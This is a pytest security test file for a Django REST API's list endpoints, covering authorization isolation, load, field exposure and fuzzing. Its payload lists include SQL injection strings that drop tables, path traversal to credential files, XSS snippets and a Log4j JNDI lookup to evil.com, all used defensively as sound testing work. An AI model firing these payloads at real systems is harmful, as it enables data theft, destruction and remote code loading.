"""
T291: Pagination Red Team Security Tests.

Paranoid security tests for pagination absence and LIST endpoint vulnerabilities.
OWASP API Top 10 2023: API1:2023 BOLA, API4:2023 Resource Consumption, API3:2023 BOPLA
"""

import concurrent.futures
import time

import pytest

from model_bakery import baker
from rest_framework.test import APIClient

from api.core.models import Role, User
from api.schedule.models import Playlist
from api.storage.models import File, Library

# SecLists SQLi payloads sample
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT null,null,null--",
    "1; DROP TABLE users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' OR '1'='1",
    "%20or%201=1",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
]

# Path traversal patterns
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
]

# XSS payloads for stored XSS test
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    """'-><script>alert(1)</script>""",
]

# Naughty strings (edge cases)
NAUGHTY_STRINGS = [
    "null",
    "undefined",
    "true",
    "false",
    "None",
    "NaN",
    "Infinity",
    "-Infinity",
    "\x00",  # Null byte
    "\uffff",  # Non-character
    "日本語",
    "🔥💀😈",
    "<>",
    "${jndi:ldap://evil.com}",  # Log4j
]


@pytest.mark.django_db
class TestBOLAListEndpoints:
    """API1:2023 - Broken Object Level Authorization on LIST endpoints."""

    @pytest.mark.xfail(reason="BOLA vulnerability: T874", strict=True)
    def test_files_list_user_isolation(self, api_client, faker):
        """User A should NOT see User B's files in LIST response. (T874)"""
        # Create users
        user_a = baker.make(
            User, username=f"user_a_{faker.user_name()}", role=Role.HOST,
        )
        user_b = baker.make(
            User, username=f"user_b_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="BOLA", name="BOLA Test", description="Test",
        )

        # Create files for user A
        files_a = []
        for i in range(3):
            f = baker.make(
                File,
                name=f"user_a_file_{i}.mp3",
                mime="audio/mp3",
                library=library,
                owner=user_a,
            )
            files_a.append(f.id)

        # Create files for user B
        files_b = []
        for i in range(3):
            f = baker.make(
                File,
                name=f"user_b_file_{i}.mp3",
                mime="audio/mp3",
                library=library,
                owner=user_b,
            )
            files_b.append(f.id)

        # Authenticate as user A
        client_a = APIClient()
        client_a.force_authenticate(user=user_a)

        # Get LIST as user A
        response = client_a.get("/api/v2/files")
        assert response.status_code == 200
        data = response.json()

        # Extract IDs from response
        returned_ids = [item["id"] for item in data]

        # User A should see their own files
        for fid in files_a:
            assert fid in returned_ids, f"User A should see their file {fid}"

        # User A should NOT see User B's files (BOLA check)
        for fid in files_b:
            if fid in returned_ids:
                pytest.fail(
                    f"BOLA VULNERABILITY: User A can see User B's file {fid}",
                )

    @pytest.mark.xfail(reason="BOLA vulnerability: T874", strict=True)
    def test_playlists_list_user_isolation(self, api_client, faker):
        """User A should NOT see User B's playlists. (T874)"""
        user_a = baker.make(
            User, username=f"pl_a_{faker.user_name()}", role=Role.HOST,
        )
        user_b = baker.make(
            User, username=f"pl_b_{faker.user_name()}", role=Role.HOST,
        )

        # Create playlists
        pl_a_ids = []
        for i in range(3):
            pl = baker.make(Playlist, name=f"Playlist A {i}", owner=user_a)
            pl_a_ids.append(pl.id)

        pl_b_ids = []
        for i in range(3):
            pl = baker.make(Playlist, name=f"Playlist B {i}", owner=user_b)
            pl_b_ids.append(pl.id)

        # Authenticate as user A
        client_a = APIClient()
        client_a.force_authenticate(user=user_a)

        response = client_a.get("/api/v2/playlists")
        assert response.status_code == 200
        data = response.json()

        returned_ids = [item["id"] for item in data]

        # User A should see their playlists
        for pid in pl_a_ids:
            assert (
                pid in returned_ids
            ), f"User A should see their playlist {pid}"

        # User A should NOT see User B's playlists
        for pid in pl_b_ids:
            if pid in returned_ids:
                pytest.fail(
                    f"BOLA VULNERABILITY: User A can see User B's playlist {pid}",
                )

    def test_list_returns_only_owned_data(self, api_client, faker):
        """Comprehensive BOLA test across multiple endpoints."""
        user_a = baker.make(
            User, username=f"owner_a_{faker.user_name()}", role=Role.HOST,
        )
        user_b = baker.make(
            User, username=f"owner_b_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="MULTI", name="Multi", description="Test",
        )

        # Create mixed data
        baker.make(
            File, name="a.mp3", mime="audio/mp3", library=library, owner=user_a,
        )
        baker.make(
            File, name="b.mp3", mime="audio/mp3", library=library, owner=user_b,
        )
        baker.make(Playlist, name="Playlist A", owner=user_a)
        baker.make(Playlist, name="Playlist B", owner=user_b)

        # Test as user A
        client_a = APIClient()
        client_a.force_authenticate(user=user_a)

        endpoints = [
            "/api/v2/files",
            "/api/v2/playlists",
            "/api/v2/smart-blocks",
        ]

        for endpoint in endpoints:
            response = client_a.get(endpoint)
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, list):
                    for item in data:
                        # Check owner field if present
                        if "owner" in item and isinstance(item["owner"], dict):
                            owner_id = item["owner"].get("id")
                            if owner_id and owner_id != user_a.id:
                                pytest.fail(
                                    f"BOLA at {endpoint}: item owned by {owner_id}",
                                )


@pytest.mark.django_db(transaction=True)
class TestResourceExhaustionNoPagination:
    """API4:2023 - Unrestricted Resource Consumption via no pagination."""

    @pytest.mark.slow
    def test_list_large_dataset_response_time(self, api_client, faker):
        """LIST with 500+ records should still respond reasonably."""
        user = baker.make(
            User, username=f"load_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="LOAD", name="Load Test", description="Test",
        )

        # Create 500 files
        for i in range(500):
            baker.make(
                File,
                name=f"bulk_file_{i}.mp3",
                mime="audio/mp3",
                library=library,
                owner=user,
            )

        # Measure response time
        start = time.time()
        response = api_client.get("/api/v2/files")
        duration = time.time() - start

        assert response.status_code == 200
        data = response.json()
        assert len(data) >= 500

        # Should respond within reasonable time (5 seconds)
        # If not, it's a potential DoS vector
        if duration > 5:
            pytest.fail(
                f"PERFORMANCE ISSUE: LIST took {duration}s for 500 records",
            )

    def test_concurrent_list_requests(self, api_client, faker):
        """Multiple concurrent LIST requests = DoS vector."""
        user = baker.make(
            User, username=f"dos_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="DOS", name="DoS Test", description="Test",
        )

        # Create some data
        for i in range(50):
            baker.make(
                File,
                name=f"dos_file_{i}.mp3",
                mime="audio/mp3",
                library=library,
                owner=user,
            )

        def make_request():
            start = time.time()
            response = api_client.get("/api/v2/files")
            duration = time.time() - start
            return response.status_code, duration

        # Fire 20 concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(make_request) for _ in range(20)]
            results = [
                f.result() for f in concurrent.futures.as_completed(futures)
            ]

        # All should succeed
        statuses = [r[0] for r in results]
        assert all(
            s == 200 for s in statuses
        ), f"Some requests failed: {statuses}"

        # Check if any took too long
        durations = [r[1] for r in results]
        max_duration = max(durations)
        if max_duration > 10:
            pytest.fail(
                f"DoS VULNERABILITY: Max response time {max_duration}s under load",
            )

    def test_response_size_limits(self, api_client, faker):
        """Response should have reasonable size limits."""
        user = baker.make(
            User, username=f"size_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="SIZE", name="Size Test", description="Test",
        )

        # Create files with large metadata (within DB limits)
        for i in range(100):
            baker.make(
                File,
                name=f"file_{i}.mp3",
                mime="audio/mp3",
                library=library,
                owner=user,
                track_title="X" * 500,  # Large strings (max 512)
                artist_name="Y" * 500,
                album_title="Z" * 500,
            )

        response = api_client.get("/api/v2/files")
        assert response.status_code == 200

        # Check response size
        content_length = len(response.content)
        # 100 records with large metadata could be huge
        if content_length > 5 * 1024 * 1024:  # 5MB
            pytest.fail(
                f"LARGE RESPONSE: {content_length} bytes - potential DoS vector",
            )


@pytest.mark.django_db
class TestQueryParamFuzzing:
    """Fuzzing query parameters on LIST endpoints."""

    @pytest.mark.parametrize("payload", SQLI_PAYLOADS)
    def test_filter_sql_injection_files(self, api_client, payload, faker):
        """SQLi attempts in filter parameters should return 400, not 500."""
        user = baker.make(
            User, username=f"sqli_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="SQLI", name="SQLi Test", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        # Try SQLi in various filter params
        filter_params = ["name", "mime", "track_title", "artist_name"]

        for param in filter_params:
            response = api_client.get(f"/api/v2/files?{param}={payload}")
            # Should not crash with 500
            if response.status_code == 500:
                pytest.fail(f"SQLi caused 500 on {param}={payload}")
            # 400 is acceptable (bad request)
            assert response.status_code in [200, 400, 404]

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_filter_path_traversal(self, api_client, payload, faker):
        """Path traversal in filter parameters."""
        user = baker.make(
            User, username=f"path_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="PATH", name="Path Test", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        response = api_client.get(f"/api/v2/files?name={payload}")
        # Should not crash
        assert response.status_code != 500

    @pytest.mark.parametrize("payload", NAUGHTY_STRINGS)
    def test_filter_naughty_strings(self, api_client, payload, faker):
        """Edge case strings in filters."""
        user = baker.make(
            User, username=f"naughty_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="NAUGHTY", name="Naughty", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        try:
            response = api_client.get(f"/api/v2/files?name={payload}")
            # Should handle gracefully
            assert response.status_code in [200, 400, 404]
        except Exception as e:
            pytest.fail(f"Exception on naughty string '{payload}': {e}")

    def test_pagination_params_rejected(self, api_client, faker):
        """Pagination params should be handled (ignored or rejected)."""
        user = baker.make(
            User, username=f"page_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="PAGE", name="Page", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        params = [
            "page=1",
            "page=999999",
            "limit=10",
            "limit=-1",
            "offset=0",
            "offset=999999",
            "page_size=20",
            "per_page=50",
        ]

        for param in params:
            response = api_client.get(f"/api/v2/files?{param}")
            # Should not crash
            assert response.status_code in [
                200,
                400,
            ], f"Param {param} caused {response.status_code}"

    def test_sort_param_sql_injection(self, api_client, faker):
        """SQLi via sort/order parameters."""
        user = baker.make(
            User, username=f"sort_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="SORT", name="Sort", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        sqli_sorts = [
            "sort=id' OR '1'='1",
            "sort=(SELECT * FROM users)",
            "order=; DROP TABLE files;--",
        ]

        for sort_param in sqli_sorts:
            response = api_client.get(f"/api/v2/files?{sort_param}")
            assert (
                response.status_code != 500
            ), f"SQLi in sort param caused 500: {sort_param}"


@pytest.mark.django_db
class TestMassDataExposure:
    """API3:2023 - Sensitive data exposure in LIST responses."""

    def test_list_does_not_expose_sensitive_fields(self, api_client, faker):
        """LIST should not expose internal/sensitive fields."""
        user = baker.make(
            User, username=f"expose_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="EXPOSE", name="Expose", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        response = api_client.get("/api/v2/files")
        assert response.status_code == 200
        data = response.json()
        assert len(data) > 0

        sensitive_fields = [
            "password",
            "secret",
            "token",
            "api_key",
            "internal_notes",
            "_state",  # Django internal
        ]

        for item in data:
            for field in sensitive_fields:
                if field in item:
                    pytest.fail(
                        f"Sensitive field '{field}' exposed in LIST response",
                    )

    def test_list_vs_retrieve_field_consistency(self, api_client, faker):
        """LIST should not expose more fields than RETRIEVE."""
        user = baker.make(
            User, username=f"consist_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="CONSIST", name="Consist", description="Test",
        )
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        # Get LIST
        list_response = api_client.get("/api/v2/files")
        list_data = list_response.json()
        list_item = next(
            (f for f in list_data if f["id"] == file_obj.id), None,
        )
        assert list_item is not None

        # Get RETRIEVE
        retrieve_response = api_client.get(f"/api/v2/files/{file_obj.id}")
        retrieve_data = retrieve_response.json()

        # LIST fields should be subset of RETRIEVE fields
        list_fields = set(list_item.keys())
        retrieve_fields = set(retrieve_data.keys())

        extra_in_list = list_fields - retrieve_fields
        if extra_in_list:
            pytest.fail(
                f"LIST exposes fields not in RETRIEVE: {extra_in_list}",
            )

    def test_list_field_count_reasonable(self, api_client, faker):
        """LIST should return fewer fields than RETRIEVE (performance)."""
        user = baker.make(
            User, username=f"count_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="COUNT", name="Count", description="Test",
        )
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        list_response = api_client.get("/api/v2/files")
        list_data = list_response.json()
        list_item = next(
            (f for f in list_data if f["id"] == file_obj.id), None,
        )

        retrieve_response = api_client.get(f"/api/v2/files/{file_obj.id}")
        retrieve_data = retrieve_response.json()

        list_field_count = len(list_item.keys())
        retrieve_field_count = len(retrieve_data.keys())

        # LIST should have fewer or equal fields
        if list_field_count > retrieve_field_count:
            pytest.fail(
                f"LIST has more fields ({list_field_count}) than RETRIEVE ({retrieve_field_count})",
            )


@pytest.mark.django_db
class TestFilterAuthorizationBypass:
    """Filter parameters should respect authorization."""

    @pytest.mark.xfail(reason="Filter bypass vulnerability: T875", strict=True)
    def test_filter_by_other_user_id_blocked(self, api_client, faker):
        """Filtering by other user's ID should not bypass auth. (T875)"""
        user_a = baker.make(
            User, username=f"filt_a_{faker.user_name()}", role=Role.HOST,
        )
        user_b = baker.make(
            User, username=f"filt_b_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="FILT", name="Filter", description="Test",
        )

        baker.make(
            File, name="a.mp3", mime="audio/mp3", library=library, owner=user_a,
        )
        baker.make(
            File, name="b.mp3", mime="audio/mp3", library=library, owner=user_b,
        )

        # Authenticate as user A
        client_a = APIClient()
        client_a.force_authenticate(user=user_a)

        # Try to filter by user B's ID
        response = client_a.get(f"/api/v2/files?owner={user_b.id}")
        assert response.status_code in [200, 403]

        if response.status_code == 200:
            data = response.json()
            # Should not return user B's files
            for item in data:
                if item.get("owner") == user_b.id:
                    pytest.fail("Filter by owner_id bypassed authorization")

    def test_filter_by_nonexistent_values(self, api_client, faker):
        """Filtering by non-existent values should return empty, not error."""
        user = baker.make(
            User, username=f"nonex_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="NONEX", name="NonEx", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        filters = [
            "owner=999999",
            "library=999999",
            "name=nonexistent_file_xyz.mp3",
        ]

        for filter_param in filters:
            response = api_client.get(f"/api/v2/files?{filter_param}")
            assert response.status_code == 200
            data = response.json()
            assert isinstance(data, list)
            # Should be empty or filtered


@pytest.mark.django_db
class TestUnicodeAndEncoding:
    """Unicode and encoding edge cases in LIST."""

    def test_unicode_in_filter_values(self, api_client, faker):
        """Unicode characters in filter values."""
        user = baker.make(
            User, username=f"unicode_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="UNI", name="Unicode", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        unicode_values = [
            "日本語",
            "العربية",
            "🎵🎶🎸",
            "<script>alert(1)</script>",
            "\u0000\u0001\u0002",  # Control chars
        ]

        for value in unicode_values:
            response = api_client.get(f"/api/v2/files?name={value}")
            assert response.status_code in [
                200,
                400,
            ], f"Unicode '{value}' caused {response.status_code}"

    def test_filter_special_characters(self, api_client, faker):
        """Special regex/wildcard characters in filters."""
        user = baker.make(
            User, username=f"special_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="SPECIAL", name="Special", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        special_chars = [
            "%",  # SQL wildcard
            "_",  # SQL wildcard
            "*",  # Regex
            "?",  # Regex
            "[",  # Regex
            "]",
            "(",  # Regex group
            ")",
        ]

        for char in special_chars:
            response = api_client.get(f"/api/v2/files?name={char}")
            assert (
                response.status_code != 500
            ), f"Special char '{char}' caused 500"


@pytest.mark.django_db
class TestHttpMethodOverride:
    """HTTP method override attempts on LIST endpoints."""

    def test_method_override_on_list(self, api_client, faker):
        """Method override headers should not bypass security."""
        user = baker.make(
            User, username=f"method_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="METHOD", name="Method", description="Test",
        )
        baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        # Try to override GET with DELETE
        headers = {
            "HTTP_X_HTTP_METHOD_OVERRIDE": "DELETE",
        }
        response = api_client.get("/api/v2/files", **headers)

        # Should still be GET behavior, not DELETE
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)

    def test_unsupported_methods_on_list(self, api_client, faker):
        """Unsupported HTTP methods on LIST endpoints."""
        user = baker.make(
            User, username=f"unsupport_{faker.user_name()}", role=Role.HOST,
        )
        library = baker.make(
            Library, code="UNS", name="Unsup", description="Test",
        )

        methods = ["PATCH", "PUT", "DELETE"]
        for method in methods:
            response = getattr(api_client, method.lower())("/api/v2/files")
            # Should return 405 Method Not Allowed
            assert response.status_code in [
                405,
                403,
                404,
            ], f"{method} returned {response.status_code}"
